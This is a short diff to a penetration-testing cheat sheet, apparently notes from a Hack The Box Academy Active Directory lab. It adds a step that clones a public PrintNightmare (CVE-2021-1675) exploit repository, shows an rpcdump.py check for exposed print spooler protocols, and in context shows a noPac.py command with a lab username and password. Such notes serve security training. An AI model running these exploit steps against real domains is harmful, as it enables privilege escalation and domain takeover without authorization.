@@ -290,6 +290,8 @@ python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-hos
 ## PrintNightmare
 [PrintNightmare](https://academy.hackthebox.com/module/143/section/1484) exploit two vulnerabilities ([CVE-2021-34527](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527) and [CVE-2021-1675](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675)) found in the [Print Spooler service](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-prsod/7262f540-dd18-46a3-b645-8ea9b59753dc) that runs on all Windows operating systems, for local privilege escalation.
 ```bash
+git clone https://github.com/cube0x0/CVE-2021-1675.git
+
 # See if "Print System Asynchronous Protocol" and "Print System Remote Protocol" are exposed on target
 rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'
 
